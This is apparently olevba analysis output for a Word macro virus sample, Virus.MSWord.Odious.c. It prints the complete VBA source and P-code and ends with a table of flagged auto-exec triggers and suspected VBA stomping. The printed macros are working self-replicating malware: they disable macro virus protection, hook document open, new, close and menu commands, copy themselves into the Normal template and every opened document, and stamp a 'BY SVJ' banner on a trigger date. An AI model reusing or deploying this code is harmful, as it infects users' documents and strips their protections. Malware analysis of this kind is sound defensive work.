olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Odious.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Odious.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SVJ_01.bas 
in file: Virus.MSWord.Odious.c - OLE stream: 'Macros/VBA/SVJ_01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Application.DefaultSaveFormat = ""
End Sub
Sub AutoOpen()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub AutoNew()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub AutoClose()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Function Virus()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Application.DisplayAlerts = wdAlertsNone
    E
    If Day(Date) = 17 And Month(Date) = 10 And Hour(Time) = 11 Then
        TextoSVJ
    End If
End Function
Function E()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Dim A, B As String
    A = Application.NormalTemplate.FullName
    B = Application.ActiveDocument.FullName
    Application.OrganizerCopy A, B, "SVJ_01", wdOrganizerObjectProjectItems
    Application.OrganizerCopy B, A, "SVJ_01", wdOrganizerObjectProjectItems
End Function
Sub ExibirCódigoVB()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Sub FerramGravarMacroAlternar()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Sub ExibirCódigo()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Sub FerramMacro()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Sub InterromperGravação()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Sub FerramentasGravarMacroIniciar()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Sub FerramentasGravarMacroParar()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Sub ArquivoModelos()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub ArquivoSalvar()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
    ActiveDocument.Save
End Sub
Function TextoSVJ()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    ActiveWindow.ActivePane.View.ShowAll = False
    If ActiveWindow.View.SplitSpecial = wdPaneNone Then
        ActiveWindow.ActivePane.View.Type = wdPageView
    Else
        ActiveWindow.View.Type = wdPageView
    End If
    Selection.ParagraphFormat.LineSpacingRule = wdLineSpaceSingle
    Selection.TypeParagraph
    Selection.MoveUp Unit:=wdLine, Count:=1
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    With Selection.Font
        .Name = "Times New Roman"
        .Size = 80
        .Bold = True
        .Italic = False
        .Underline = wdUnderlineWavy
        .StrikeThrough = False
        .DoubleStrikeThrough = False
        .Outline = False
        .Emboss = False
        .Shadow = True
        .Hidden = False
        .SmallCaps = False
        .AllCaps = False
        .ColorIndex = wdDarkBlue
        .Engrave = False
        .Superscript = False
        .Subscript = False
        .Spacing = 0
        .Scaling = 100
        .Position = 0
        .Kerning = 0
        .Animation = wdAnimationShimmer
    End With
    Selection.TypeText Text:="BY  SVJ"
    With Selection.Font
        .Name = "Times New Roman"
        .Size = 80
        .Bold = True
        .Italic = False
        .Underline = wdUnderlineWavy
        .StrikeThrough = False
        .DoubleStrikeThrough = False
        .Outline = False
        .Emboss = False
        .Shadow = True
        .Hidden = False
        .SmallCaps = False
        .AllCaps = False
        .ColorIndex = wdDarkBlue
        .Engrave = False
        .Superscript = True
        .Subscript = False
        .Spacing = 0
        .Scaling = 100
        .Position = 0
        .Kerning = 0
        .Animation = wdAnimationShimmer
    End With
    Selection.InsertSymbol Font:="Symbol", CharacterNumber:=-3870, Unicode:= _
        True
    With Selection.ParagraphFormat
        With .Borders(wdBorderLeft)
            .LineStyle = wdLineStyleThinThickSmallGap
            .LineWidth = wdLineWidth450pt
            .ColorIndex = wdBlue
        End With
        With .Borders(wdBorderRight)
            .LineStyle = wdLineStyleThickThinSmallGap
            .LineWidth = wdLineWidth450pt
            .ColorIndex = wdBlue
        End With
        With .Borders(wdBorderTop)
            .LineStyle = wdLineStyleThinThickSmallGap
            .LineWidth = wdLineWidth450pt
            .ColorIndex = wdBlue
        End With
        With .Borders(wdBorderBottom)
            .LineStyle = wdLineStyleThickThinSmallGap
            .LineWidth = wdLineWidth450pt
            .ColorIndex = wdBlue
        End With
        With .Borders
            .DistanceFromTop = 1
            .DistanceFromLeft = 4
            .DistanceFromBottom = 1
            .DistanceFromRight = 4
            .Shadow = False
        End With
    End With
    With Options
        .DefaultBorderLineStyle = wdLineStyleThinThickSmallGap
        .DefaultBorderLineWidth = wdLineWidth450pt
        .DefaultBorderColorIndex = wdBlue
    End With
    Selection.MoveDown Unit:=wdLine, Count:=1
End Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Odious.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/SVJ_01 - 7810 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt DefaultSaveFormat 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Sub AutoOpen())
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #10:
' 	ArgsCall Virus 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub AutoNew())
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #15:
' 	ArgsCall Virus 0x0000 
' Line #16:
' 	EndSub 
' Line #17:
' 	FuncDefn (Sub AutoClose())
' Line #18:
' 	OnError (Resume Next) 
' Line #19:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #20:
' 	ArgsCall E 0x0000 
' Line #21:
' 	EndSub 
' Line #22:
' 	FuncDefn (Function Virus())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #25:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #26:
' 	ArgsCall E 0x0000 
' Line #27:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0011 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	And 
' 	Ld Time 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #28:
' 	ArgsCall TextoSVJ 0x0000 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	EndFunc 
' Line #31:
' 	FuncDefn (Function E())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #34:
' 	Dim 
' 	VarDefn A
' 	VarDefn B (As String)
' Line #35:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd FullName 
' 	St A 
' Line #36:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd FullName 
' 	St B 
' Line #37:
' 	Ld A 
' 	Ld B 
' 	LitStr 0x0006 "SVJ_01"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #38:
' 	Ld B 
' 	Ld A 
' 	LitStr 0x0006 "SVJ_01"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #39:
' 	EndFunc 
' Line #40:
' 	FuncDefn (Sub ExibirCódigoVB())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #43:
' 	ArgsCall E 0x0000 
' Line #44:
' 	EndSub 
' Line #45:
' 	FuncDefn (Sub FerramGravarMacroAlternar())
' Line #46:
' 	OnError (Resume Next) 
' Line #47:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #48:
' 	ArgsCall E 0x0000 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Sub ExibirCódigo())
' Line #51:
' 	OnError (Resume Next) 
' Line #52:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #53:
' 	ArgsCall E 0x0000 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub FerramMacro())
' Line #56:
' 	OnError (Resume Next) 
' Line #57:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #58:
' 	ArgsCall E 0x0000 
' Line #59:
' 	EndSub 
' Line #60:
' 	FuncDefn (Sub InterromperGravação())
' Line #61:
' 	OnError (Resume Next) 
' Line #62:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #63:
' 	ArgsCall E 0x0000 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub FerramentasGravarMacroIniciar())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #68:
' 	ArgsCall E 0x0000 
' Line #69:
' 	EndSub 
' Line #70:
' 	FuncDefn (Sub FerramentasGravarMacroParar())
' Line #71:
' 	OnError (Resume Next) 
' Line #72:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #73:
' 	ArgsCall E 0x0000 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub ArquivoModelos())
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #78:
' 	ArgsCall Virus 0x0000 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Sub ArquivoSalvar())
' Line #81:
' 	OnError (Resume Next) 
' Line #82:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #83:
' 	ArgsCall E 0x0000 
' Line #84:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #85:
' 	EndSub 
' Line #86:
' 	FuncDefn (Function TextoSVJ())
' Line #87:
' 	OnError (Resume Next) 
' Line #88:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #89:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt ShowAll 
' Line #90:
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemLd SplitSpecial 
' 	Ld wdPaneNone 
' 	Eq 
' 	IfBlock 
' Line #91:
' 	Ld wdPageView 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #92:
' 	ElseBlock 
' Line #93:
' 	Ld wdPageView 
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	Ld wdLineSpaceSingle 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt LineSpacingRule 
' Line #96:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #97:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveUp 0x0002 
' Line #98:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #99:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #100:
' 	LitStr 0x000F "Times New Roman"
' 	MemStWith New 
' Line #101:
' 	LitDI2 0x0050 
' 	MemStWith Size 
' Line #102:
' 	LitVarSpecial (True)
' 	MemStWith Bold 
' Line #103:
' 	LitVarSpecial (False)
' 	MemStWith Italic 
' Line #104:
' 	Ld wdUnderlineWavy 
' 	MemStWith Underline 
' Line #105:
' 	LitVarSpecial (False)
' 	MemStWith StrikeThrough 
' Line #106:
' 	LitVarSpecial (False)
' 	MemStWith DoubleStrikeThrough 
' Line #107:
' 	LitVarSpecial (False)
' 	MemStWith Outline 
' Line #108:
' 	LitVarSpecial (False)
' 	MemStWith Emboss 
' Line #109:
' 	LitVarSpecial (True)
' 	MemStWith Shadow 
' Line #110:
' 	LitVarSpecial (False)
' 	MemStWith Hidden 
' Line #111:
' 	LitVarSpecial (False)
' 	MemStWith SmallCaps 
' Line #112:
' 	LitVarSpecial (False)
' 	MemStWith AllCaps 
' Line #113:
' 	Ld wdDarkBlue 
' 	MemStWith ColorIndex 
' Line #114:
' 	LitVarSpecial (False)
' 	MemStWith Engrave 
' Line #115:
' 	LitVarSpecial (False)
' 	MemStWith Superscript 
' Line #116:
' 	LitVarSpecial (False)
' 	MemStWith Subscript 
' Line #117:
' 	LitDI2 0x0000 
' 	MemStWith Spacing 
' Line #118:
' 	LitDI2 0x0064 
' 	MemStWith Scaling 
' Line #119:
' 	LitDI2 0x0000 
' 	MemStWith Position 
' Line #120:
' 	LitDI2 0x0000 
' 	MemStWith Kerning 
' Line #121:
' 	Ld wdAnimationShimmer 
' 	MemStWith Animation 
' Line #122:
' 	EndWith 
' Line #123:
' 	LitStr 0x0007 "BY  SVJ"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #124:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #125:
' 	LitStr 0x000F "Times New Roman"
' 	MemStWith New 
' Line #126:
' 	LitDI2 0x0050 
' 	MemStWith Size 
' Line #127:
' 	LitVarSpecial (True)
' 	MemStWith Bold 
' Line #128:
' 	LitVarSpecial (False)
' 	MemStWith Italic 
' Line #129:
' 	Ld wdUnderlineWavy 
' 	MemStWith Underline 
' Line #130:
' 	LitVarSpecial (False)
' 	MemStWith StrikeThrough 
' Line #131:
' 	LitVarSpecial (False)
' 	MemStWith DoubleStrikeThrough 
' Line #132:
' 	LitVarSpecial (False)
' 	MemStWith Outline 
' Line #133:
' 	LitVarSpecial (False)
' 	MemStWith Emboss 
' Line #134:
' 	LitVarSpecial (True)
' 	MemStWith Shadow 
' Line #135:
' 	LitVarSpecial (False)
' 	MemStWith Hidden 
' Line #136:
' 	LitVarSpecial (False)
' 	MemStWith SmallCaps 
' Line #137:
' 	LitVarSpecial (False)
' 	MemStWith AllCaps 
' Line #138:
' 	Ld wdDarkBlue 
' 	MemStWith ColorIndex 
' Line #139:
' 	LitVarSpecial (False)
' 	MemStWith Engrave 
' Line #140:
' 	LitVarSpecial (True)
' 	MemStWith Superscript 
' Line #141:
' 	LitVarSpecial (False)
' 	MemStWith Subscript 
' Line #142:
' 	LitDI2 0x0000 
' 	MemStWith Spacing 
' Line #143:
' 	LitDI2 0x0064 
' 	MemStWith Scaling 
' Line #144:
' 	LitDI2 0x0000 
' 	MemStWith Position 
' Line #145:
' 	LitDI2 0x0000 
' 	MemStWith Kerning 
' Line #146:
' 	Ld wdAnimationShimmer 
' 	MemStWith Animation 
' Line #147:
' 	EndWith 
' Line #148:
' 	LineCont 0x0004 0E 00 08 00
' 	LitStr 0x0006 "Symbol"
' 	ParamNamed Font 
' 	LitDI2 0x0F1E 
' 	UMi 
' 	ParamNamed CharacterNumber 
' 	LitVarSpecial (True)
' 	ParamNamed Unicode 
' 	Ld Selection 
' 	ArgsMemCall InsertSymbol 0x0003 
' Line #149:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	With 
' Line #150:
' 	StartWithExpr 
' 	Ld wdBorderLeft 
' 	ArgsMemLdWith Borders 0x0001 
' 	With 
' Line #151:
' 	Ld wdLineStyleThinThickSmallGap 
' 	MemStWith LineStyle 
' Line #152:
' 	Ld wdLineWidth450pt 
' 	MemStWith LineWidth 
' Line #153:
' 	Ld wdBlue 
' 	MemStWith ColorIndex 
' Line #154:
' 	EndWith 
' Line #155:
' 	StartWithExpr 
' 	Ld wdBorderRight 
' 	ArgsMemLdWith Borders 0x0001 
' 	With 
' Line #156:
' 	Ld wdLineStyleThickThinSmallGap 
' 	MemStWith LineStyle 
' Line #157:
' 	Ld wdLineWidth450pt 
' 	MemStWith LineWidth 
' Line #158:
' 	Ld wdBlue 
' 	MemStWith ColorIndex 
' Line #159:
' 	EndWith 
' Line #160:
' 	StartWithExpr 
' 	Ld wdBorderTop 
' 	ArgsMemLdWith Borders 0x0001 
' 	With 
' Line #161:
' 	Ld wdLineStyleThinThickSmallGap 
' 	MemStWith LineStyle 
' Line #162:
' 	Ld wdLineWidth450pt 
' 	MemStWith LineWidth 
' Line #163:
' 	Ld wdBlue 
' 	MemStWith ColorIndex 
' Line #164:
' 	EndWith 
' Line #165:
' 	StartWithExpr 
' 	Ld wdBorderBottom 
' 	ArgsMemLdWith Borders 0x0001 
' 	With 
' Line #166:
' 	Ld wdLineStyleThickThinSmallGap 
' 	MemStWith LineStyle 
' Line #167:
' 	Ld wdLineWidth450pt 
' 	MemStWith LineWidth 
' Line #168:
' 	Ld wdBlue 
' 	MemStWith ColorIndex 
' Line #169:
' 	EndWith 
' Line #170:
' 	StartWithExpr 
' 	MemLdWith Borders 
' 	With 
' Line #171:
' 	LitDI2 0x0001 
' 	MemStWith DistanceFromTop 
' Line #172:
' 	LitDI2 0x0004 
' 	MemStWith DistanceFromLeft 
' Line #173:
' 	LitDI2 0x0001 
' 	MemStWith DistanceFromBottom 
' Line #174:
' 	LitDI2 0x0004 
' 	MemStWith DistanceFromRight 
' Line #175:
' 	LitVarSpecial (False)
' 	MemStWith Shadow 
' Line #176:
' 	EndWith 
' Line #177:
' 	EndWith 
' Line #178:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #179:
' 	Ld wdLineStyleThinThickSmallGap 
' 	MemStWith DefaultBorderLineStyle 
' Line #180:
' 	Ld wdLineWidth450pt 
' 	MemStWith DefaultBorderLineWidth 
' Line #181:
' 	Ld wdBlue 
' 	MemStWith DefaultBorderColorIndex 
' Line #182:
' 	EndWith 
' Line #183:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveDown 0x0002 
' Line #184:
' 	EndFunc 
' Line #185:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

